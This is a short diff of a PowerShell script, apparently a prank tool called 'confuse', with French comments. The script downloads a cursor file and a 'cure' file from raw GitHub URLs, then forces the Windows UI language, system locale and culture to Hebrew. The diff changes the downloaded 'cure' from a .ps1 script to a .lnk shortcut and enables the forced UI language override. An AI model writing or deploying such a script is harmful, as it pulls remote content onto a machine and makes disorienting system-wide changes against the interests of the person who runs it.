@@ -19,8 +19,8 @@ $CursorPath = "$FolderPath\cursor.cur"
 Invoke-WebRequest -Uri $CursorUrl -OutFile $CursorPath
 
 # -------------------- TÉLÉCHARGER LE CURE --------------------
-$CureUrl = "https://raw.githubusercontent.com/NonoTheLion/confuse/main/cure.ps1"
-$CurePath = "$FolderPath\cure.ps1"
+$CureUrl = "https://raw.githubusercontent.com/NonoTheLion/confuse/main/data/cure.lnk"
+$CurePath = "$FolderPath\cure.lnk"
 
 Invoke-WebRequest -Uri $CureUrl -OutFile $CurePath
 
@@ -29,7 +29,7 @@ $LanguageTag = "he-IL"
 $UserLanguageList = Get-WinUserLanguageList
 $UserLanguageList.Add($LanguageTag)
 Set-WinUserLanguageList $UserLanguageList -Force
-# Set-WinUILanguageOverride -Language $LanguageTag
+Set-WinUILanguageOverride -Language $LanguageTag
 Set-WinUserLanguageList $LanguageTag -Force
 Set-WinSystemLocale $LanguageTag
 Set-Culture $LanguageTag
